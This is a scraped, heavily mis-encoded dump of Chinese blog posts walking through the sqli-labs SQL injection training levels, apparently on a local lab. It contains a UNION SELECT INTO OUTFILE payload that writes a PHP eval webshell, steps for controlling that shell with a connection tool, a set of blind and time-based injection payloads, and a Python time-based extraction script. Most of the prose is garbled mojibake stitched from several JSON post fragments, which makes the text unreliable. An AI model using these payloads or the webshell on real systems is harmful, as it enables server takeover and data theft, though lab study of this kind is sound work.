æ‰€ä»¥æˆ‘ç›´æ¥ç”¨substræŸ¥äº†ï¼Œç„¶åå¦‚æœæ¢æˆå…¶ä»–çš„ä»–å°±ä¼šæŠ¥é”™ï¼Œå¥½åƒæ¥ä¸‹æ¥ä¹Ÿæ²¡å•¥å¤ªå¤§åŒºåˆ«äº†ï¼Ÿ OK ä¸€æ¨¡ä¸€æ ·ï¼Œä½†æ˜¯æˆ‘çœ‹å¤–é¢é‚£ä¸ªæ ‡é¢˜ å’Œå…¶ä»–çš„ä¹Ÿä¸ä¸€æ ·å•Šï¼Œ æ˜¯å«åšDUMP into outfile å³åˆ©ç”¨æ–‡ä»¶å¯¼å…¥çš„æ–¹å¼è¿›è¡Œæ³¨å…¥ï¼ˆæ–‡ä»¶ä¸Šä¼ æ³¨å…¥ï¼‰åŸæ¥è¿™ä¹ˆå¿«å°±è¦ä½¿ç”¨webshall äº†ï¼šå®‰è£…å¥½webshallä»¥åï¼Œhttps://blog.csdn.net/qq_34965596/article/details/104076019?utm_medium=distribute.pc_relevant.none-task-blog-OPENSEARCH-7.add_param_isCf&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-OPENSEARCH-7.add_param_isCfè¿™ä¸ªæ˜¯webshallçš„ç®€å•ä½¿ç”¨æ•™ç¨‹ æˆ‘ä»¬å¼€å§‹ä½¿ç”¨è¿™ä¸ªæ–‡ä»¶å¯¼å…¥çš„æ–¹å¼è¿›è¡Œæ³¨å…¥ï¼šåŸºç¡€çŸ¥è¯†ï¼š1.å¦‚æœæœåŠ¡ç«¯ä»£ç å«é˜Ÿå®¢æˆ·ç«¯ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œä¸¥æ ¼çš„éªŒè¯å’Œè¿‡æ»¤ï¼Œå°±å®¹æ˜“é€ æˆå¯ä»¥ä¸Šä¼ ä»»æ„æ–‡ä»¶çš„æƒ…å†µï¼ŒåŒ…æ‹¬ä¸Šä¼ è„šæœ¬æ–‡ä»¶ï¼ˆaspã€aspxã€phpã€jspç­‰æ ¼å¼çš„æ–‡ä»¶ï¼‰å±å®³ï¼šéæ³•ç”¨æˆ·å¯ä»¥åˆ©ç”¨ä¸Šä¼ çš„æ¶æ„è„šæœ¬æ–‡ä»¶æ§åˆ¶æ•´ä¸ªç½‘ç«™ï¼Œç”šè‡³æ§åˆ¶æœåŠ¡å™¨ã€‚è¿™ä¸ªæ¶æ„çš„è„šæœ¬æ–‡ä»¶ï¼Œåˆè¢«æˆä¸ºwebshellï¼Œä¹Ÿå¯å°†webshellè„šæœ¬æˆä¸ºä¸€ç§ç½‘é¡µåé—¨ï¼Œwebshellè„šæœ¬å…·æœ‰éå¸¸å¼ºå¤§çš„åŠŸèƒ½ï¼Œæ¯”å¦‚æŸ¥çœ‹æœåŠ¡å™¨ç›®å½•ã€æœåŠ¡å™¨ä¸­çš„æ–‡ä»¶ã€æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ç­‰ã€‚ä»Šå¤©å°±å…ˆç®€å•çš„ä½¿ç”¨ä¸€ä¸‹select into outfile ç›´æ¥å†™å…¥1.åˆ©ç”¨æ¡ä»¶ï¼ˆ1ï¼‰å¯¹webç›®å½•éœ€è¦æœ‰å†™æƒé™èƒ½å¤Ÿä½¿ç”¨å•å¼•å·ï¼ˆrootï¼‰ï¼ˆ2ï¼‰çŸ¥é“ç½‘ç«™ç»å¯¹è·¯å¾„ï¼ˆè¿™æ¬¡ç”±äºç½‘ç«™ç›´æ¥æ­è½½åœ¨æœ¬æœºä¸‹ï¼Œæ‰€ä»¥å¯ä»¥å¾ˆå®¹æ˜“å¾—çŸ¥ï¼‰ï¼ˆ3ï¼‰secure_file_priv æ²¡æœ‰å…·ä½“å€¼2.æŸ¥çœ‹secure_file_privå€¼secure_file_priv æ˜¯ç”¨æ¥é™åˆ¶ load dumpfileã€into outfileã€load_file() å‡½æ•°åœ¨å“ªä¸ªç›®å½•ä¸‹æ‹¥æœ‰ä¸Šä¼ æˆ–è€…è¯»å–æ–‡ä»¶çš„æƒé™ã€‚å½“ secure_file_priv çš„å€¼ä¸º NULL ï¼Œè¡¨ç¤ºé™åˆ¶ mysqld ä¸å…è®¸å¯¼å…¥|å¯¼å‡ºï¼Œæ­¤æ—¶æ— æ³•ææƒå½“ secure_file_priv çš„å€¼ä¸º /tmp/ ï¼Œè¡¨ç¤ºé™åˆ¶ mysqld çš„å¯¼å…¥|å¯¼å‡ºåªèƒ½å‘ç”Ÿåœ¨ /tmp/ ç›®å½•ä¸‹ï¼Œæ­¤æ—¶ä¹Ÿæ— æ³•ææƒå½“ secure_file_priv çš„å€¼æ²¡æœ‰å…·ä½“å€¼æ—¶ï¼Œè¡¨ç¤ºä¸å¯¹ mysqld çš„å¯¼å…¥|å¯¼å‡ºåšé™åˆ¶ï¼Œæ­¤æ—¶å¯ææƒæˆ‘å‘ç°æˆ‘çš„secure_file_privæ˜¯æœ‰å€¼çš„ æ‰€ä»¥æˆ‘å°±æ‰¾åˆ°inié…ç½®æ–‡ä»¶https://blog.csdn.net/believe_today/article/details/79223684 è¿™ä¸ªæ˜¯æŸ¥æ‰¾æ•™ç¨‹ ç„¶åå°†é‚£ä¸ªæ•°å€¼åˆ æ‰ è®°å¾—é‡å¯mysqlï¼Œä¸ç„¶æ²¡ç”¨æ¥ä¸‹æ¥å°±æ˜¯ä½¿ç”¨ 1union select 1,2 ,&quot;&lt;?php @eval($_POST[cmd]);?&gt;&quot; into outfile 'D:\\\\apache\\\\www\\\\sqli-labs-php7-master\\\\Less-7\\\\123.php' --+ æœ‰ä¸ªéœ€è¦æ³¨æ„çš„ç‚¹1è¿™è¾¹çš„æ–œæ æ˜¯ä¸¤ä¸ªã€‚åœ¨è¾“å…¥è¿™æ®µä»£ç ä»¥å å‡ºç°äº†è¿™ä¸¤ä¸ªå³ä½¿æŠ¥é”™äº† æ–‡ä»¶ä¾æ—§ç”Ÿæˆäº†æ¥ä¸‹æ¥å°±æ˜¯åˆ©ç”¨èœåˆ€å·¥å…·ï¼Œè¿æ¥è¿™ä¸ªæœ¨é©¬ï¼Œæ§åˆ¶æ–‡ä»¶ é…ç½®æ˜¯è¿™æ ·çš„ è¿™ä¸ªè¿æ¥å¯†ç æ˜¯é‚£ä¸ªphpä¸€å¥ç—…æ¯’çš„posté‡Œé¢çš„å­—ç¬¦ ç‚¹å‡»æ·»åŠ å³å¯ï¼ˆPS:æˆ‘ä¸€ç›´æŒ‰æµ‹è¯•è¿æ¥ï¼Œä¸€ç›´è¯´è¿”å›å€¼ä¸ºç©ºï¼Œæˆ‘äººå‚»äº†ï¼‰ ç„¶åæ·»åŠ å®Œä»¥åï¼Œå³é”®é‚£ä¸ª ç‚¹å‡»æ–‡ä»¶ç®¡ç† OK æ‰“å¼€æ–°ä¸–ç•Œçš„å¤§é—¨ è¿™é‡Œéœ€è¦è¡¥å……ä¸€ä¸‹ï¼Œæ¥ä¸‹æ¥å›åˆ°åˆšæ‰æ·»åŠ åœ°å€çš„é‚£ä¸ªé¡µé¢å³é”®å•å‡»æˆ‘ä»¬æ·»åŠ çš„åœ°å€ï¼Œç„¶åæŒ‰æ•°æ®ç®¡ç†ï¼Œç„¶åç‚¹å‡»æ•°æ®åº“ï¼Œè¾“å…¥è¿™äº›ä¿¡æ¯ï¼Œè®°å¾—ï¼ï¼ï¼ï¼æ•°æ®åº“ç±»å‹æ˜¯mysqliï¼ˆåˆ†ç‰ˆæœ¬çš„ï¼‰okå¥½äº† æ•°æ®åº“ ä¸€è§ˆæ— é— æ”»å‡»æˆåŠŸ è¡¥å……çŸ¥è¯†ï¼š1.PHPä¸€å¥æœ¨é©¬æ˜¯è¿™æ ·çš„ eval()ï¼ševalå‡½æ•°å°†æ¥å—çš„å­—ç¬¦ä¸²å½“åšä»£ç æ‰§è¡Œå‚æ•°æƒ…å†µï¼š ï¼ˆ1ï¼‰å¦‚æœå‚æ•°æ˜¯ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œeval() å‡½æ•°å°†æ‰§è¡Œè¡¨è¾¾å¼ï¼› ï¼ˆ2ï¼‰ å¦‚æœå‚æ•°æ˜¯Javascriptè¯­å¥ï¼Œeval()å°†æ‰§è¡Œ Javascript è¯­å¥ï¼›æ³¨æ„ï¼šï¼ˆå¦‚æœæ‰§è¡Œç»“æœæ˜¯ä¸€ä¸ªå€¼å°±è¿”å›ï¼Œä¸æ˜¯å°±è¿”å›undefinedï¼Œå¦‚æœå‚æ•°ä¸æ˜¯ä¸€ ä¸ªå­—ç¬¦ä¸²ï¼Œåˆ™ç›´æ¥è¿”å›è¯¥å‚æ•°ï¼‰è¯­æ³•ï¼ševal(string)æ¡ˆä¾‹ï¼ševal(â€œvar a=1â€);//å£°æ˜ä¸€ä¸ªå˜é‡aå¹¶èµ‹å€¼1ã€‚eval(â€œ2+3â€);//æ‰§è¡ŒåŠ è¿ç®—ï¼Œå¹¶è¿”å›è¿ç®—å€¼ã€‚eval(â€œmytest()â€);//æ‰§è¡Œmytest()å‡½æ•°ã€‚å‡½æ•°ä½œç”¨åŸŸï¼ševal()å‡½æ•°å¹¶ä¸ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„ä½œç”¨åŸŸï¼Œå¹¶ä¸”å®ƒçš„ä½œç”¨åŸŸå°±æ˜¯å®ƒæ‰€åœ¨çš„ä½œç”¨åŸŸï¼Œæœ‰æ—¶å€™éœ€è¦å°†eval()å‡½æ•°çš„ä½œç”¨åŸŸè®¾ç½®ä¸ºå…¨å±€ï¼Œå½“ç„¶å¯ä»¥å°†eval()åœ¨å…¨å±€ä½œç”¨åŸŸä¸­ä½¿ç”¨ï¼Œè¿™ä¸ªæ—¶å€™å¯ä»¥ç”¨window.eval()çš„æ–¹å¼å®ç°ã€‚ 1234&lt;?php @eval($_POST['hacker']);?&gt; //è§£æä¸€ä¸‹è¿™å¥è¯ï¼šhackeræ˜¯å¯†ç ï¼Œé€šè¿‡postæäº¤æ•°æ®ï¼Œ$_POSTæ˜¯è¶…å…¨å±€å˜é‡//@ç¬¦å·çš„æ„æ€æ˜¯ä¸æŠ¥é”™//åœ¨å†™è¯­å¥çš„æ—¶å€™æ³¨æ„ ?&lt;php è¿™ä¸‰ä¸ªä¹‹é—´æ— ç©ºæ ¼ //å¯†ç æœ‰æ— å¼•å·é—®é¢˜ä¸å¤§ å°†è¿™ä¸ªä¸€å¥è¯æœ¨é©¬å†™å…¥æ–‡ä»¶ä¸Šä¼ åˆ°ç½‘ç«™ï¼Œç„¶åæ‰“å¼€è¿™ä¸ªè¿™ä¸ªå‡½æ•°å¥½åƒè¿˜æœ‰å…¶ä»–ä¸œè¥¿æ²¡è¢«æˆ‘æƒ³åˆ°ï¼Œæœ‰ç‚¹æ€ªæ€ªçš„ï¼Ÿï¼Ÿï¼Ÿ æ„Ÿè§‰æ²¡è¿™ä¹ˆç®€å• æ‰€ä»¥é‡æ–°å¼€äº†ä¸ªåšå®¢æ•´ç†è¿™ä¸ªæ–‡ä»¶ä¸Šä¼ æ³¨å…¥çš„çŸ¥è¯† 2.webshellweb åº”ç”¨ç®¡ç†å·¥å…·ï¼Œæ­£å¸¸æƒ…å†µä¸‹ï¼Œè¿ç»´äººå‘˜å¯ä»¥é€šè¿‡ webshell é’ˆå¯¹ web æœåŠ¡å™¨è¿›è¡Œæ—¥å¸¸çš„è¿ç»´ç®¡ç†ä»¥åŠç³»ç»Ÿä¸Šçº¿æ›´æ–°ç­‰ï¼Œé‚£ä¹ˆæ”»å‡»è€…ä¹Ÿå¯ä»¥é€šè¿‡ webshell æ¥ç®¡ç† web åº”ç”¨æœåŠ¡å™¨ã€‚ æ³•2ä¹Ÿå¯ç›´æ¥å°†æ•°æ®åº“çš„æ•°æ®å­˜åˆ°æ–‡æ¡£ä¸­ LESS-8åœ¨è¿™ä¸ªå½“ä¸­æˆ‘ä»¬ å‘ç°ä»–æ˜¯æ²¡æœ‰æŠ¥é”™ä¿¡æ¯çš„ é‚£ä¹ˆæˆ‘ä»¬å°±æ— æ³•ä½¿ç”¨ç±»ä¼¼ä¹‹å‰çš„æŠ¥é”™æ³¨å…¥äº†ã€‚æ‰€ä»¥å°±éœ€è¦æ—¶é—´æ³¨å…¥æ”»å‡»è¿™é‡Œæˆ‘ä»¬å°±éœ€è¦å…ˆäº†è§£ä¸€ä¸ªsleepï¼ˆï¼‰å‡½æ•°å®ƒçš„åŠŸèƒ½æ˜¯å¯ä»¥è®©mysqlçš„æ‰§è¡Œæ—¶é—´å˜é•¿ä¸€ç­å’Œifï¼ˆexpr1ï¼Œexpr2ï¼Œexpr3ï¼‰ç»“åˆä½¿ç”¨ï¼Œæ­¤ifè¯­å¥å«ä¹‰æ˜¯ï¼šå¦‚æœexpr1æ˜¯true åˆ™ifï¼ˆï¼‰çš„è¿”å›æ˜¯expr2ï¼Œå¦åˆ™åˆ™è¿”å›çš„å€¼ä¸ºexpr3ã€‚æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬è¾“å…¥ 1ifï¼ˆlength(database()&gt;1),sleep(5),1) è¿™ä¸ªè¯­å¥çš„æ„æ€å°±æ˜¯ï¼Œå¦‚æœæ•°æ®åº“åç§°çš„é•¿åº¦å¤§äº1,é‚£ä¹ˆå»¶è¿Ÿäº”ç§’é’Ÿå“åº”ï¼Œåä¹‹æŸ¥è¯¢1é‚£ä¹ˆæˆ‘ä»¬æ€ä¹ˆçŸ¥é“ä»–çš„å“åº”æ—¶é—´å‘¢ç«ç‹æµè§ˆå™¨ ç„¶åæŒ‰ç½‘ç»œå³å¯ é‚£æ¥ä¸‹æ¥å°±æ˜¯æŸ¥è¯¢è¡¨çš„åå­— 1and if(substr((select table_name from information_schema.tables where table_schema='security'limit 0,1 ),1,1) = 'e',sleep(5),1) --+ æ¥ä¸‹æ¥çš„æ­¥éª¤éƒ½å¾ˆç›¸ä¼¼äº† ç¬¬ä¹å…³è¿™ä¸ªå…³å’Œç¬¬å…«å…³è¿˜æŒºåƒçš„ï¼Œä½†æ˜¯è¿™å…³è¿æŠ¥é”™éƒ½æ²¡æœ‰ï¼Œéƒ½æ˜¯you are in é‚£è¿™ä¸ªæ—¶å€™ å¾ˆæ˜æ˜¾å°±åªèƒ½åˆ©ç”¨æ—¶é—´æ¥åˆ¤æ–­æ˜¯å¦æ³¨å…¥äº† å› ä¸ºä¸ç®¡æ˜¯ and 1=1 è¿˜æ˜¯ and1=2 ç”»é¢éƒ½ä¸ä¼šæœ‰å˜åŒ–ï¼Œå› ä¸ºæŠ¥é”™è¯­å¥å·²ç»å…¨éƒ¨å˜æˆyou are inäº† ä¸€æ ·çš„ä»£ç ä¸€æ ·çš„æµ‹è¯•ç»“æœï¼Œåé¢å°±ä¸å†æˆªå›¾äº† ç”¨å°±æ˜¯æœ€åæŸ¥è¯¢å­—æ®µå†…å®¹äº† ç¬¬åå…³æ ¹æ®æ ‡é¢˜ double quoteså¯ä»¥çŸ¥é“è¿™æ¬¡éœ€è¦ä½¿ç”¨åŒå¼•å·çš„æ³¨å…¥ ç„¶åå†åŠ ä¸Šæ—¶é—´ç›²æ³¨ é‚£å…¶ä»–è¿‡ç¨‹éƒ½å’Œä¹‹å‰çš„ä¸€æ · æ•´ç†æ—¶é—´ç›²æ³¨ä»£ç ï¼š 1234 and if(substr(database(),1,1)='s',sleep(5),1) --+and if(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1)='e',sleep(5),1) --+and if(substr((select column_name from information_schema.columns where table_name='emails' limit 0,1),1,1)&gt;'e',sleep(5),1) --+and if(substr((select email_id from emails limit 0,1),1,1)='D',sleep(5),1) --+ è¯´å‡ ä¸ªéœ€è¦æ³¨æ„çš„ç‚¹å§ï¼Œé¦–å…ˆ æ˜¯ç©ºæ ¼ä¸€å®šè¦åœ¨è‹±æ–‡æ¨¡å¼ä¸‹æ‰“ï¼Œå…¶æ¬¡ æ‹¬å·è¦åˆ†æ¸…å‡ ä¸ªï¼Œç„¶åæ¯”å¦‚è¯´æˆ‘ä»¬è¦æ‰¾å­—æ®µå å°±æ˜¯column_name è€Œcolumn_name æ˜¯ä»è¡¨ä¸­ä¹Ÿå°±æ˜¯table_nameé‡Œé¢æ‰¾åˆ°çš„ è¿™ä¸ªè¦ç†è§£ä¸€ä¸‹ï¼Œä¸ç„¶ä¸€ç›´è®°é”™å¾ˆéš¾å— é™„pythonæ—¶é—´ç›²æ³¨è„šæœ¬: 1234567891011121314151617import requestsimport datetimes=requests.session()url=&quot;http://localhost:81/sqli-labs-php7-master/Less-9?id=1&quot;payload_try='0123456789abcdefghijklmnopqrstuvwxyz'passwd=''for i in range(1,9): for j in payload_try: payload=f&quot;'and if(substr((select group_concat(table_name) from information_schema.tables where table_schema='security'),{i},1)='{j}',sleep(1),1)--+&quot; print(payload) time1=datetime.datetime.now() r=s.get(url+payload) time2=datetime.datetime.now() sec=(time2-time1).seconds if sec&gt;=1: passwd+=j print(passwd)","link":"/2020/11/16/sqlilabs-3/"},{"title":"sqlilabs1","text":"åœ¨ç¬¬äºŒå…³ä¸­ æˆ‘é¦–å…ˆç”¨and 1=1 å’Œand1=2 å¾—åˆ°çš„ç»“æœæ˜¯ä¸ä¸€è‡´ï¼Œè¯´æ˜æˆ‘ä»¬çš„è¯­å¥å¯ä»¥è¢«æ³¨å…¥ä½¿ç”¨,ä¹Ÿå³å­˜åœ¨æ³¨å…¥ç‚¹ï¼š æ¥ä¸‹æ¥æˆ‘ä»¬å°±è¦åˆ©ç”¨è¿™ä¸ªæ³¨å…¥ç‚¹è¾“å…¥è¯­å¥äº† è¿™ä¸ªæ˜¯æˆ‘ä»¬åŠ ä¸ªâ€˜å‘ç°æ˜¯å’Œä¸Šä¸€é¢˜æ˜¯ä¸ä¸€æ ·çš„ è¾“å…¥å•å¼•å·ï¼Œæ ¹æ®æŠ¥é”™ä¿¡æ¯ç¡®å®šå’±ä»¬è¾“å…¥çš„å†…å®¹è¢«åŸå°ä¸åŠ¨çš„å¸¦å…¥åˆ°æ•°æ®åº“ä¸­ï¼Œä¹Ÿå¯å«åšæ•°å­—å‹æ³¨å…¥ï¼Œ è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å‘ç°ç¬¬äºŒå…³ç›¸æ¯”ç¬¬ä¸€å…³å°‘äº†ä¸€ä¸ªå•å¼•å·ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™é¢˜æˆ‘ä»¬å°±æ— é¡»åŠ å•å¼•å·ï¼Œç›´æ¥å†™æŸ¥è¯¢ä»£ç å°±å¯ä»¥äº†ï¼ˆçœ‹çœ‹æˆ‘ä»¬ä¸Šé¢æ‰§è¡Œçš„andå…¶å®ä¹Ÿå°±å¯ä»¥çŸ¥é“äº†ï¼‰ è¿™ä¸ªæ—¶å€™æˆ‘ä»¬è¿˜æ˜¯ç”¨order by æŸ¥è¯¢ä»–çš„å­—æ®µæ•°ï¼Œå¯ä»¥å‘ç°ï¼Œä¾æ—§ä¸º3ï¼›ç„¶åæˆ‘ä»¬ä½¿ç”¨unionè”åˆselect åœ¨è¿™é‡Œå‘ç°ä¸€ä¸ªç¥å¥‡çš„äº‹æƒ…ï¼Œæ˜¯ä¸æ˜¯ç”¨â€“+æ³¨é‡Šæ‰åé¢éƒ½å¯ä»¥ï¼Œæ²¡å•¥åŒºåˆ« è¿™è¾¹æœ‰ä¸€ç‚¹æˆ‘éœ€è¦å†æ˜ç¡®çš„ï¼šæˆ‘ä»¬æ˜¯å…ˆè·å¾—æ•°æ®åº“database()çš„åå­—ï¼Œåœ¨é€šè¿‡æ•°æ®åº“çš„åå­—åæŸ¥è¯¢è¡¨åtable_nameï¼Œå†çŸ¥é“è¡¨åä¹‹åï¼ŒæŸ¥è¯¢å­—æ®µåcolumn_nameåé¢å’Œå‰é¢çš„ç¬¬ä¸€å…³æ˜¯å¾ˆç±»ä¼¼çš„ï¼Œå°±ä¸è¯¦ç»†è¯´ æ¥ä¸‹æ¥æ˜¯ç¬¬ä¸‰å…³å½“æˆ‘è¾“å…¥and 1=1 æˆ–è€…æ˜¯ and1=2çš„æ—¶å€™ï¼Œé¡µé¢æ²¡æœ‰ä»»ä½•åŒºåˆ«ï¼Œæ‰€ä»¥è¿™ä¸ªå’Œç¬¬äºŒå…³ä¸å¤ªä¸€æ ·ï¼Œæ­¤æ—¶æˆ‘ä»¬å†å°è¯•ä¸€ä¸‹è¾“å…¥å•å¼•å· é¡µé¢å˜æˆå¦‚ä¸‹ ä»é”™è¯¯æŠ¥å‘Šä¸­æˆ‘ä»¬å¯ä»¥çŸ¥é“ 12use near ''1'') LIMIT 0,1' at line 1SELECT * FROM users WHERE id=('1'') LIMIT 0,1 è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å‘ç° åœ¨è¾“å…¥å•å¼•å·åï¼Œåé¢å¤šäº†ä¸€ä¸ªæ‹¬å·ï¼Œ æˆ‘ä»¬æŠŠuseçš„é‚£æ¡è¡¥å……å®Œæ•´ï¼Œåº”è¯¥æ˜¯use near â€˜(â€˜1â€™â€™) LIMIT 0,1â€™ at line 1è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å¯ä»¥æ¨æµ‹å‡ºè¿™æ¬¡çš„ç¨‹åºå¦‚æœè¦æ‰§è¡Œä»£ç åº”è¯¥æ˜¯è¦ï¼ˆâ€™æ‰§è¡Œå†…å®¹â€™ï¼‰ï¼Œæ‰€ä»¥æˆ‘ä»¬å°è¯•ä¸€ä¸‹åœ¨â€™åé¢åŠ ä¸€ä¸ªæ‹¬å·ï¼Œè®©æ•´ä¸ªè¯­å¥å˜æˆuse near â€˜(â€˜1â€™)â€™ â€˜) limitâ€™ **è®©æˆ‘å°è¯•ä¸€ä¸‹ å‘ç°ä»–æ˜¯å˜æˆè¿™æ ·çš„ï¼šuse near â€˜â€™) LIMIT 0,1â€™ at line 1 å°±åƒæˆ‘åœ¨ç¬¬ä¸€å…³è¯´çš„ï¼Œï¼ˆâ€™1â€™ï¼‰ å› ä¸ºå·²ç»æ˜¯åˆæ³•æ•°æ®ï¼Œæ‰€ä»¥å°±æ²¡å‡ºç°äº†ï¼Œç¬¦åˆæˆ‘çš„çŒœæƒ³ï¼Œæˆ‘ä¸€å¼€å§‹è¯´è¦æ‰§è¡Œä»£ç éœ€è¦ï¼ˆâ€™å†…å®¹â€™ï¼‰è¿™ä¸ªæ ¼å¼ï¼Œæ‰€ä»¥æˆ‘æ¥ä¸‹æ¥ä¾¿è¾“å…¥äº†ï¼š?id=1â€™)(â€˜and1=1â€™) å¹¶ä¸”æ— è®ºæ˜¯å¦åŠ  â€“+ éƒ½æ˜¯é”™è¯¯çš„ï¼Œæ‰€ä»¥æˆ‘å°±çº³é—·å•Šï¼Œä¸ºå•¥å‘¢ï¼Œåæ¥å‘ç°æ˜¯è¦ï¼ˆâ€™â€™ï¼‰è¿™ä¸ªå½¢å¼æ²¡é”™ä½†æ˜¯ï¼Œæˆ‘ä»¬å°†è¯­å¥è¿˜åŸå›å»ä¸€ä¸‹use near â€˜(â€˜(â€˜1â€™)and1=1â€™)â€™** æ­¤æ—¶æˆ‘ä»¬å°±å¯ä»¥å‘ç°å…¶å®and1=1 æ˜¯ï¼ˆâ€™â€™ï¼‰è¿™ä¸ªå½¢å¼äº†åœ¨åé¢åŠ ä¸Šæ³¨é‡Šç¬¦ï¼Œå³å¯ æ­¤æ—¶æˆ‘ä»¬å‘ç°ï¼Œå­˜åœ¨æ³¨å…¥ç‚¹ï¼Œæ¥ä¸‹æ¥å°±å’Œå‰ä¸¤é¢˜åº”è¯¥æ²¡ä»€ä¹ˆåŒºåˆ«äº†å§è®©æˆ‘å°è¯•ä¸€æ³¢æ­¤æ—¶æœ‰ç‚¹å°æ— è¯­ï¼Œå› ä¸ºæ²¡æœ‰è®©å‰é¢çš„idä¸ºå‡ï¼Œå¯¼è‡´æˆ‘ä¸€ç›´è¾“å‡ºdumbï¼Œæˆ‘è¿˜åœ¨æƒ³å“ªé‡Œå‡ºé”™äº†ï¼Œæ— è¯­äº†å’Œä¹‹å‰çš„æ²¡å•¥åŒºåˆ«ï¼Œå°±ä¸è¯´äº†å“ˆå“ˆå“ˆå“ˆè¡¥å……ä¸€ä¸‹å°±æ˜¯ ä¸€å¼€å§‹çš„group_concat(column_name) è¿™è¾¹è¿™ä¸ªtableæˆ–è€…columnæ˜¯ä¸ç”¨åŠ sçš„ï¼Œéœ€è¦åŠ çš„æ˜¯information_schema.columnsè¿™è¾¹éœ€è¦åŠ ï¼Œè¿™ä¸€æ•´ä¸ªè¯­å¥ä¸­å°±æ˜¯è¿™é‡Œéœ€è¦åŠ ã€‚å¥½åƒä¹Ÿæ²¡å•¥è¦å†™çš„ï¼Œå¦‚æœæœ‰çš„è¯å†æ¥è¡¥å……å§ ç¬¬å››å…³è¿™ä¸ªå‰å››å…³éƒ½ä¸€æ¨¡ä¸€æ ·å•Šï¼Œæˆ‘æœ¬æ¥æƒ³ç¬¬å››å…³é‡æ–°å†™ä¸€ç¯‡åšå®¢æ°´ä¸€ä¸‹ï¼Œå¯æ˜¯ä¸€çœ‹åˆ°é¢˜ç›®å°±çŸ¥é“è·Ÿå‰ä¸‰ç¯‡å‡ ä¹ä¸€æ¨¡ä¸€æ ·å§ï¼Ÿå”¯ä¸€ä¸åŒçš„æ˜¯è¿™æ¬¡æ˜¯åŒå¼•å·â€ ç¡®å®ä¸€æ¨¡ä¸€æ ·ï¼Œæ²¡å•¥å¥½è¯´çš„","link":"/2020/11/07/sqlilabs1/"},{"title":"sqlilabs2","text":"sqlilabsç¬¬äº”å…³è¿™æ¬¡çš„å’Œä¹‹å‰å››å…³å°±å¾ˆä¸ä¸€æ ·äº†ï¼Œè™½ç„¶è¿˜æ˜¯å•å¼•å·çš„å­—ç¬¦å‹æ³¨å…¥ï¼Œä½†æ˜¯ è¿™ä¸ªyou are in å°±å¾ˆå°´å°¬ï¼Œé™¤äº†æŠ¥é”™ï¼Œä¸ç„¶éƒ½æ˜¯you are inã€‚ã€‚ã€‚ã€‚æ‰€ä»¥è¦æ€ä¹ˆåŠå‘¢è¿™ä¸ªæ—¶å€™å°±è¦çŸ¥é“ä»€ä¹ˆå«ç›²æ³¨äº† ç›²æ³¨å°±æ˜¯åœ¨ sql æ³¨å…¥è¿‡ç¨‹ä¸­ï¼Œsql è¯­å¥æ‰§è¡Œçš„é€‰æ‹©åï¼Œé€‰æ‹©çš„æ•°æ®ä¸èƒ½å›æ˜¾ åˆ°å‰ç«¯é¡µé¢ã€‚æ­¤æ—¶ï¼Œæˆ‘ä»¬éœ€è¦åˆ©ç”¨ä¸€äº›æ–¹æ³•è¿›è¡Œåˆ¤æ–­æˆ–è€…å°è¯•ï¼Œè¿™ä¸ªè¿‡ç¨‹ç§°ä¹‹ä¸ºç›²æ³¨ ç›²æ³¨æœ‰ä¸‰ç±»â€¢åŸºäºå¸ƒå°” SQL ç›²æ³¨â€¢åŸºäºæ—¶é—´çš„ SQL ç›²æ³¨ â€¢åŸºäºæŠ¥é”™çš„ SQL ç›²æ³¨å…ˆä»å¸ƒå°”sqlç›²æ³¨è¯´èµ·å§ é¦–å…ˆæ˜¯sqlæ³¨å…¥æˆªå–å­—ç¬¦ä¸²å¸¸ç”¨å‡½æ•°é¦–å…ˆæ˜¯midï¼ˆï¼‰å‡½æ•°æ­¤å‡½æ•°ä¸ºæˆªå–å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†è¯­æ³•ï¼šMIDï¼ˆcolumn_name,start,[length]ï¼‰ egï¼š str=â€123456â€ mid(str,2,1) ç»“æœä¸º2 ä¾‹å­ï¼š ï¼ˆ1ï¼‰MID(DATABASE(),1,1)&gt;â€™aâ€™,æŸ¥çœ‹æ•°æ®åº“åç¬¬ä¸€ä½ï¼ŒMID(DATABASE(),2,1)æŸ¥çœ‹æ•°æ®åº“åç¬¬äºŒä½ï¼Œä¾æ¬¡æŸ¥çœ‹å„ä½å­—ç¬¦ã€‚ ï¼ˆ2ï¼‰MID((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0xxxxxxx LIMIT 0,1),1,1)&gt;â€™aâ€™æ­¤å¤„column_nameå‚æ•°å¯ä»¥ä¸ºsqlè¯­å¥ï¼Œå¯è‡ªè¡Œæ„é€ sqlè¯­å¥è¿›è¡Œæ³¨å…¥ã€‚ substr()å‡½æ•° Substr()å’Œsubstring()å‡½æ•°å®ç°çš„åŠŸèƒ½æ˜¯ä¸€æ ·çš„ï¼Œå‡ä¸ºæˆªå–å­—ç¬¦ä¸²ã€‚string substring(string, start, length)string substr(string, start, length)å‚æ•°æè¿°åŒmid()å‡½æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸ºè¦å¤„ç†çš„å­—ç¬¦ä¸²ï¼Œstartä¸ºå¼€å§‹ä½ç½®ï¼Œlengthä¸ºæˆªå–çš„é•¿åº¦ã€‚ä¾‹å­ï¼š(1) substr(DATABASE(),1,1)&gt;â€™aâ€™,æŸ¥çœ‹æ•°æ®åº“åç¬¬ä¸€ä½ï¼Œsubstr(DATABASE(),2,1)æŸ¥çœ‹æ•°æ®åº“åç¬¬äºŒä½ï¼Œä¾æ¬¡æŸ¥çœ‹å„ä½å­—ç¬¦ã€‚(2) substr((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema=0xxxxxxx LIMIT 0,1),1,1)&gt;â€™aâ€™æ­¤å¤„stringå‚æ•°å¯ä»¥ä¸ºsqlè¯­å¥ï¼Œå¯è‡ªè¡Œæ„é€ sqlè¯­å¥è¿›è¡Œæ³¨å…¥ Left()å‡½æ•° 